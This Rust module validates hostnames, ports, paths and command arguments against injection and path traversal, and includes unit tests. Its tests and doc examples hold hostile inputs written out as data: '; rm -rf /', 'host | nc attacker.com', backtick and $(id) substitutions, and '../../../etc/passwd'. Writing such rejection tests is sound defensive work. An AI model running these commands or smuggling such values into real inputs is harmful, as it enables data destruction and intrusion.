//! Input validation utilities
//!
//! SECURITY: This module provides secure input validation functions
//! to prevent command injection, path traversal, and other attacks.

use std::path::{Path, PathBuf};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

/// Validation error types
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ValidationError {
    /// Invalid hostname format
    InvalidHostname(String),
    /// Invalid port number
    InvalidPort(u16),
    /// Path traversal attempt
    PathTraversal(String),
    /// Invalid path
    InvalidPath(String),
    /// Invalid command argument
    InvalidArgument(String),
    /// Input too long
    TooLong { max: usize, got: usize },
}

impl std::fmt::Display for ValidationError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::InvalidHostname(h) => write!(f, "Invalid hostname: {}", h),
            Self::InvalidPort(p) => write!(f, "Invalid port: {}", p),
            Self::PathTraversal(p) => write!(f, "Path traversal attempt: {}", p),
            Self::InvalidPath(p) => write!(f, "Invalid path: {}", p),
            Self::InvalidArgument(a) => write!(f, "Invalid argument: {}", a),
            Self::TooLong { max, got } => {
                write!(f, "Input too long (max: {}, got: {})", max, got)
            }
        }
    }
}

impl std::error::Error for ValidationError {}

/// Maximum hostname length (RFC 1035)
const MAX_HOSTNAME_LENGTH: usize = 255;

/// Maximum label length in hostname (RFC 1035)
const MAX_LABEL_LENGTH: usize = 63;

/// Validate hostname against strict rules
///
/// SECURITY: Prevents command injection via hostname parameter
///
/// Allowed formats:
/// - Domain names: example.com, sub.example.com
/// - IPv4 addresses: 192.168.1.1
/// - IPv6 addresses: ::1, 2001:db8::1
///
/// # Examples
/// ```
/// use rustdesk::security::validate_hostname;
///
/// assert!(validate_hostname("example.com").is_ok());
/// assert!(validate_hostname("192.168.1.1").is_ok());
/// assert!(validate_hostname("::1").is_ok());
/// assert!(validate_hostname("; rm -rf /").is_err());
/// ```
pub fn validate_hostname(hostname: &str) -> Result<String, ValidationError> {
    // Check length
    if hostname.is_empty() {
        return Err(ValidationError::InvalidHostname(
            "Hostname cannot be empty".to_string(),
        ));
    }

    if hostname.len() > MAX_HOSTNAME_LENGTH {
        return Err(ValidationError::TooLong {
            max: MAX_HOSTNAME_LENGTH,
            got: hostname.len(),
        });
    }

    // Try parsing as IP address first
    if hostname.parse::<IpAddr>().is_ok() {
        return Ok(hostname.to_string());
    }

    // Validate as domain name
    // RFC 1035: Labels must start with letter/digit, contain only letters/digits/hyphens
    let labels: Vec<&str> = hostname.split('.').collect();

    if labels.is_empty() {
        return Err(ValidationError::InvalidHostname(
            "No labels in hostname".to_string(),
        ));
    }

    for label in labels {
        if label.is_empty() {
            return Err(ValidationError::InvalidHostname(
                "Empty label in hostname".to_string(),
            ));
        }

        if label.len() > MAX_LABEL_LENGTH {
            return Err(ValidationError::TooLong {
                max: MAX_LABEL_LENGTH,
                got: label.len(),
            });
        }

        // Check first character is alphanumeric
        if !label.chars().next().unwrap().is_ascii_alphanumeric() {
            return Err(ValidationError::InvalidHostname(format!(
                "Label must start with alphanumeric: {}",
                label
            )));
        }

        // Check all characters are valid
        for ch in label.chars() {
            if !ch.is_ascii_alphanumeric() && ch != '-' {
                return Err(ValidationError::InvalidHostname(format!(
                    "Invalid character '{}' in label: {}",
                    ch, label
                )));
            }
        }

        // Check doesn't end with hyphen
        if label.ends_with('-') {
            return Err(ValidationError::InvalidHostname(format!(
                "Label cannot end with hyphen: {}",
                label
            )));
        }
    }

    Ok(hostname.to_string())
}

/// Validate port number
///
/// SECURITY: Ensures port is within valid range
///
/// # Examples
/// ```
/// use rustdesk::security::validate_port;
///
/// assert!(validate_port(3389).is_ok());
/// assert!(validate_port(0).is_err());
/// assert!(validate_port(65536).is_err());
/// ```
pub fn validate_port(port: u16) -> Result<u16, ValidationError> {
    if port == 0 {
        return Err(ValidationError::InvalidPort(port));
    }
    Ok(port)
}

/// Validate and sanitize file system path
///
/// SECURITY: Prevents path traversal attacks
///
/// # Examples
/// ```
/// use rustdesk::security::validate_path;
///
/// assert!(validate_path("/valid/path").is_ok());
/// assert!(validate_path("../../../etc/passwd").is_err());
/// assert!(validate_path("/valid/../traversal").is_err());
/// ```
pub fn validate_path(path: &str) -> Result<PathBuf, ValidationError> {
    let path_buf = Path::new(path);

    // Check for path traversal components
    for component in path_buf.components() {
        match component {
            std::path::Component::ParentDir => {
                return Err(ValidationError::PathTraversal(path.to_string()));
            }
            std::path::Component::Normal(s) => {
                // Check for hidden traversal attempts
                if s.to_string_lossy().contains("..") {
                    return Err(ValidationError::PathTraversal(path.to_string()));
                }
            }
            _ => {}
        }
    }

    // Try to canonicalize if path exists
    match path_buf.canonicalize() {
        Ok(canonical) => Ok(canonical),
        Err(_) => {
            // Path doesn't exist, return normalized path
            Ok(path_buf.to_path_buf())
        }
    }
}

/// Sanitize command argument
///
/// SECURITY: Prevents command injection via arguments
///
/// Removes or escapes dangerous characters that could be used for injection:
/// - Shell metacharacters: ; | & $ ` \ " ' < > ( ) [ ] { } *? ~
/// - Newlines and control characters
///
/// # Examples
/// ```
/// use rustdesk::security::sanitize_command_arg;
///
/// assert!(sanitize_command_arg("safe-arg").is_ok());
/// assert!(sanitize_command_arg("; rm -rf /").is_err());
/// assert!(sanitize_command_arg("arg && evil").is_err());
/// ```
pub fn sanitize_command_arg(arg: &str) -> Result<String, ValidationError> {
    // Check for dangerous characters
    const DANGEROUS_CHARS: &[char] = &[
        ';', '|', '&', '$', '`', '\\', '"', '\'', '<', '>', '(', ')', '[', ']', '{', '}', '*',
        '?', '~', '\n', '\r', '\t', '\0',
    ];

    for ch in arg.chars() {
        if DANGEROUS_CHARS.contains(&ch) {
            return Err(ValidationError::InvalidArgument(format!(
                "Argument contains dangerous character: '{}'",
                ch
            )));
        }

        // Check for control characters
        if ch.is_control() {
            return Err(ValidationError::InvalidArgument(
                "Argument contains control characters".to_string(),
            ));
        }
    }

    // Additional check for command chaining attempts
    if arg.contains("&&") || arg.contains("||") {
        return Err(ValidationError::InvalidArgument(
            "Argument contains command chaining".to_string(),
        ));
    }

    Ok(arg.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_hostname_valid() {
        assert!(validate_hostname("example.com").is_ok());
        assert!(validate_hostname("sub.example.com").is_ok());
        assert!(validate_hostname("192.168.1.1").is_ok());
        assert!(validate_hostname("::1").is_ok());
        assert!(validate_hostname("2001:db8::1").is_ok());
        assert!(validate_hostname("localhost").is_ok());
    }

    #[test]
    fn test_validate_hostname_invalid() {
        assert!(validate_hostname("").is_err());
        assert!(validate_hostname("; rm -rf /").is_err());
        assert!(validate_hostname("host; evil").is_err());
        assert!(validate_hostname("host && command").is_err());
        assert!(validate_hostname("host | nc attacker.com").is_err());
        assert!(validate_hostname("host`whoami`").is_err());
        assert!(validate_hostname("host$(id)").is_err());
        assert!(validate_hostname("-invalid.com").is_err());
        assert!(validate_hostname("invalid-.com").is_err());
    }

    #[test]
    fn test_validate_hostname_too_long() {
        let long_hostname = "a".repeat(256);
        assert!(validate_hostname(&long_hostname).is_err());
    }

    #[test]
    fn test_validate_port_valid() {
        assert!(validate_port(80).is_ok());
        assert!(validate_port(443).is_ok());
        assert!(validate_port(3389).is_ok());
        assert!(validate_port(65535).is_ok());
    }

    #[test]
    fn test_validate_port_invalid() {
        assert!(validate_port(0).is_err());
    }

    #[test]
    fn test_validate_path_valid() {
        assert!(validate_path("/valid/path").is_ok());
        assert!(validate_path("relative/path").is_ok());
        assert!(validate_path("./current/path").is_ok());
    }

    #[test]
    fn test_validate_path_traversal() {
        assert!(validate_path("../../../etc/passwd").is_err());
        assert!(validate_path("/valid/../traversal").is_err());
        assert!(validate_path("path/with/../traversal").is_err());
    }

    #[test]
    fn test_sanitize_command_arg_valid() {
        assert!(sanitize_command_arg("safe-arg").is_ok());
        assert!(sanitize_command_arg("safe_arg123").is_ok());
        assert!(sanitize_command_arg("arg-with-dashes").is_ok());
        assert!(sanitize_command_arg("arg.with.dots").is_ok());
    }

    #[test]
    fn test_sanitize_command_arg_dangerous() {
        assert!(sanitize_command_arg("; rm -rf /").is_err());
        assert!(sanitize_command_arg("arg && evil").is_err());
        assert!(sanitize_command_arg("arg || evil").is_err());
        assert!(sanitize_command_arg("arg | nc").is_err());
        assert!(sanitize_command_arg("arg`whoami`").is_err());
        assert!(sanitize_command_arg("arg$(id)").is_err());
        assert!(sanitize_command_arg("arg > file").is_err());
        assert!(sanitize_command_arg("arg < file").is_err());
    }

    #[test]
    fn test_sanitize_command_arg_control_chars() {
        assert!(sanitize_command_arg("arg\nwith\nnewlines").is_err());
        assert!(sanitize_command_arg("arg\twith\ttabs").is_err());
        assert!(sanitize_command_arg("arg\0with\0nulls").is_err());
    }
}
